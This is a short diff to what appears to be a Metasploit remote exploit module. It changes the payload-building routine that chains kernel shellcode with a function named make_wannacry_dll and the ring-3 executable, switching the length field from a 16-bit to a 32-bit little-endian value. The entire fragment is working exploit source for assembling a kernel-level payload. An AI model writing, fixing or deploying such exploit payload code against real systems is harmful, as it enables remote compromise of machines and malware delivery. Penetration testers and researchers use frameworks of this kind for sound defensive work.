@@ -390,8 +390,8 @@ class MetasploitModule < Msf::Exploit::Remote
   def make_kernel_user_payload(ring3)
     sc = make_kernel_shellcode()
     sc << make_wannacry_dll()
-	# add EXE length after the DLL
-    sc << [ring3.length].pack('S<')
+    # add EXE length in little endian after the DLL
+    sc << [ring3.length].pack('V')
     sc << ring3
 
     sc
